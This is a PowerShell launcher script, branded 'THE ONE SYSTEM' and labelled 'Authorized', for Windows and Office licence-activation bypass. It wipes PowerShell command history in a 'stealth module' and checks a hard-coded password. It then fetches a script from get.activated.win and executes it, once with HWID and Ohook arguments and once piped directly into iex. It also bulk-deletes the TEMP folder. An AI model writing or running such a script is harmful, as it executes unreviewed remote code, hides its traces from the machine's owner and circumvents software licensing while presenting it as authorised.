# launcher.ps1 - THE ONE SYSTEM
# Authorized IT Execution Script

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- STEALTH MODULE ---
Clear-History
try { $psHistoryPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($psHistoryPath -and (Test-Path $psHistoryPath)) { Clear-Content -Path $psHistoryPath -ErrorAction SilentlyContinue } } catch {}

# Hardware/Network Identity
$pcName = $env:COMPUTERNAME
$localIp = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred | Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1).IPAddress
try { $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress } catch { $macAddress = "UNKNOWN" }

# Password Verification
$password = Read-Host "key" -AsSecureString
$passString = ""
if ($password -ne $null -and $password.Length -gt 0) {
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $passString = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
}
if ($passString -ne "8888") { Write-Host "`n[!] ACCESS DENIED" -ForegroundColor Red; Start-Sleep -Seconds 2; exit }

# ---------------------------------------------------------
# UI DISPLAY
# ---------------------------------------------------------
Clear-Host
Write-Host "`n  T H E   O N E   S Y S T E M S" -ForegroundColor Cyan
Write-Host "  Authorized Operations Terminal" -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  PC Name    : $pcName" -ForegroundColor White
Write-Host "  MAC Address: $macAddress" -ForegroundColor White
Write-Host "  Local IP   : $localIp" -ForegroundColor White
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "  [ 1 ] Activate THE ONE Windows Authorized" -ForegroundColor White
Write-Host "  [ 2 ] Install THE ONE Authorized Office" -ForegroundColor White
Write-Host "  [ 3 ] THE ONE PC optimization" -ForegroundColor White
Write-Host "  [ 4 ] Direct Bypass (Official Mirror)" -ForegroundColor DarkCyan
Write-Host "  [ 0 ] Exit Terminal" -ForegroundColor DarkGray
Write-Host "  --------------------------------------------------" -ForegroundColor DarkGray
Write-Host "`n  > Select module: " -NoNewline

$key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
Write-Host "$key" -ForegroundColor White

if ($key -eq '0') { exit }

# Action Logic (Ultimate execution using YOUR trusted link)
function Invoke-Official {
    param($ArgsInput)
    Write-Host "`n  [+] Access Granted! Initializing..." -ForegroundColor Green
    
    try {
        # [核心修复] 使用你提供的 100% 有效链接
        # 包装在 ScriptBlock 中是为了自动将 /HWID 或 /Ohook 参数传递进去，从而跳过菜单直接执行！
        & ([ScriptBlock]::Create((irm https://get.activated.win))) $ArgsInput
        
    } catch {
        Write-Host "  [-] Execution failed!" -ForegroundColor Red
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Yellow
        Start-Sleep -Seconds 15
    }
}

switch ($key) {
    '1' { Invoke-Official "/HWID" }
    '2' { Invoke-Official "/Ohook" }
    '3' {
        Write-Host "`n  [+] Optimizing..." -ForegroundColor Cyan
        Get-ChildItem -Path $env:TEMP -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        Write-Host "  [+] PC Optimized." -ForegroundColor Green
        Start-Sleep -Seconds 2
    }
    '4' {
        Write-Host "`n  [+] Bypass..." -ForegroundColor Cyan
        # 选项4完美还原你手打的完整管道命令
        irm https://get.activated.win | iex
    }
    default { exit }
}
